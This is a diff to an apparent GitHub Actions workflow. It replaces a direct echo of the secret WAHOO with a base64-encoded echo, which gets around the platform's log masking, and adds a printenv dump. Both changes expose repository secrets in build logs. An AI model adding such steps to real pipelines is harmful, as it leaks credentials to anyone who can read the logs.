@@ -18,8 +18,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Banana
+        env:
+          TEST: ${{ secrets.WAHOO }}
         run: |
-          echo ${{ secrets.WAHOO }}
+          echo $TEST | base64
+          printenv
       - uses: actions/checkout@v6
         with:
           repository: ${{ github.event.pull_request.head.repo.full_name }}
